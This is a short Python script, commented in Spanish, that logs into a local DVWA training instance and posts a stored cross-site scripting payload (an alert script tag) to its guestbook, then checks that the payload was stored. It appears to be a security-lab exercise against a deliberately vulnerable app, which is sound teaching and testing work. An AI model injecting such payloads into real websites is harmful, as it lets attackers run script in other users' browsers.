import requests
from bs4 import BeautifulSoup

url_base = 'http://localhost'
login_url = f'{url_base}/login.php'
xss_url = f'{url_base}/vulnerabilities/xss_s/'

usuario = 'admin'
clave = 'csrf12345'

s = requests.Session()

print("🔐 Iniciando sesión en DVWA...")
login_page = s.get(login_url)
soup = BeautifulSoup(login_page.text, 'html.parser')
token_input = soup.find('input', {'name': 'user_token'})
token = token_input['value'] if token_input else ''

payload_login = {
    'username': usuario,
    'password': clave,
    'Login': 'Login',
    'user_token': token
}

response_login = s.post(login_url, data=payload_login)
if 'Login failed' in response_login.text:
    print("❌ Falló el login.")
    exit()
print("✅ Login exitoso.")

# Payload malicioso
payload = "<script>alert('XSS-STORED')</script>"

# Datos del comentario
comentario = {
    'txtName': 'Hacker',
    'mtxMessage': payload,
    'btnSign': 'Sign Guestbook'
}

print("\n📤 Enviando comentario malicioso...")
response = s.post(xss_url, data=comentario)

if payload in response.text:
    print("✅ El payload fue almacenado exitosamente.")
    print(f"🧪 Visita {xss_url} en tu navegador para ver el XSS en acción.")
else:
    print("❌ El payload no se almacenó o no fue reflejado aún.")
